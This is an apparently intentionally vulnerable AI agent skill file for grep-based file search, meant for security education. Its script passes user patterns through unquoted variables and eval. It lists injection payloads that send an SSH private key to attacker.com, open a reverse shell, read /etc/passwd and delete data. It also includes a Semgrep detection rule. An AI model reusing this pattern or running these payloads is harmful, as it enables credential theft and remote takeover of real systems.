---
name: file-search
description: Search files using grep with user-provided patterns
metadata:
  author: VTrust Security Labs
  version: 1.0.0-vulnerable
  license: MIT
  category: filesystem
tags:
  - filesystem
  - search
  - grep
  - VULNERABLE
dependencies:
  - bash
  - grep
---

# File Search Skill (VULNERABLE VERSION)

⚠️ **WARNING**: This skill contains a CRITICAL command injection vulnerability (CWE-77)

## Description

This skill allows searching for text patterns in files using grep. It accepts user-provided search patterns and executes them via shell commands.

## Usage

Search for a pattern in project files:

```bash
# User input: "TODO"
grep "TODO" /project/src/**/*.py

# User input: "FIXME"
grep "FIXME" /project/docs/*.md
```

## Tools Used

- `bash` - Shell command execution
- `grep` - Text pattern matching
- `find` - File discovery

## Implementation

The skill executes grep commands with user-provided patterns:

```bash
#!/bin/bash

# Get search pattern from user
PATTERN="$1"
DIRECTORY="${2:-.}"

# VULNERABLE: Direct command execution without sanitization
grep "$PATTERN" $DIRECTORY/**/*

# Alternative vulnerable approach
eval "grep $PATTERN $DIRECTORY/**/*"
```

## 🔴 VULNERABILITY: Command Injection (CWE-77)

### Attack Vector

Unquoted variables and `eval` allow arbitrary command execution:

```bash
# Malicious input: "TODO"; cat /etc/passwd #"
grep "TODO"; cat /etc/passwd #" /project/**/*

# Result: Searches for TODO, then exposes /etc/passwd
```

### Exploitation Examples

1. **Data Exfiltration**:
   ```
   Pattern: "test"; curl http://attacker.com/?data=$(cat ~/.ssh/id_rsa) #
   ```

2. **Reverse Shell**:
   ```
   Pattern: "x"; bash -i >& /dev/tcp/attacker.com/4444 0>&1 #
   ```

3. **File Modification**:
   ```
   Pattern: "foo"; rm -rf /important/data #
   ```

4. **Privilege Escalation**:
   ```
   Pattern: "bar"; sudo -l > /tmp/privs.txt #
   ```

### STRIDE Analysis

- **S**poofing: ❌ Not applicable
- **T**ampering: ✅ Can modify files via injected commands
- **R**epudiation: ✅ No logging of actual commands executed
- **I**nformation Disclosure: ✅ Can read sensitive files
- **D**enial of Service: ✅ Can crash system with resource exhaustion
- **E**levation of Privilege: ✅ Can execute commands as skill user

**DREAD Score**: 9.5/10 (Critical)

### OWASP Mapping

- **OWASP Top 10 2021**: A03:2021 - Injection
- **OWASP API Security Top 10**: API8:2023 - Security Misconfiguration

### Detection Patterns

SAST tools should flag:
- Unquoted shell variable expansion: `$VARIABLE`
- Use of `eval` with user input
- Direct command execution with user-controlled strings
- Missing input validation/sanitization

Semgrep rule:
```yaml
rules:
  - id: command-injection-skill
    pattern: |
      grep "$USER_INPUT" ...
    message: Command injection via unquoted variable
    severity: ERROR
```

## 🔒 Secure Version

See `../secure/SKILL.md` for the properly secured implementation.

## 📚 Learning Resources

- [CWE-77: Command Injection](https://cwe.mitre.org/data/definitions/77.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Bash Security Best Practices](https://mywiki.wooledge.org/BashGuide/Practices)

## ⚠️ Disclaimer

This is an intentionally vulnerable skill for educational purposes. DO NOT use in production.
